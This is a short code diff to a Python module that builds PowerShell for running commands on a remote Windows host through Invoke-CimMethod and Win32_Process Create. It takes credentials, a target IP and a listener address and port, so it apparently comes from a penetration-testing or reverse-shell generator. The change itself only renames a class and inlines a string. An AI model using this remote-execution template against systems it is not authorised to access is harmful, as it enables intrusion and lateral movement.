@@ -3,12 +3,7 @@ from textwrap import dedent
 from shells import Shells
 from connection import Connection
 
-POSTAMBLE = (
-    "Invoke-CimMethod -CimSession $Session -ClassName Win32_Process "
-    "-MethodName Create -Arguments @{CommandLine =$Command};"
-)
-
-class Wmi(Connection):
+class CimSession(Connection):
     @staticmethod
     def get_ps(username: str, password: str, target_ip: str, 
                listen_address: str, listen_port: str) -> str:
@@ -33,5 +28,8 @@ class Wmi(Connection):
         result = ""
         result += preamble
         result += f"\n$Command = '{command_line}';\n\n"
-        result += POSTAMBLE
+        result += (
+            "Invoke-CimMethod -CimSession $Session -ClassName Win32_Process "
+            "-MethodName Create -Arguments @{CommandLine =$Command};")
+        
         return result
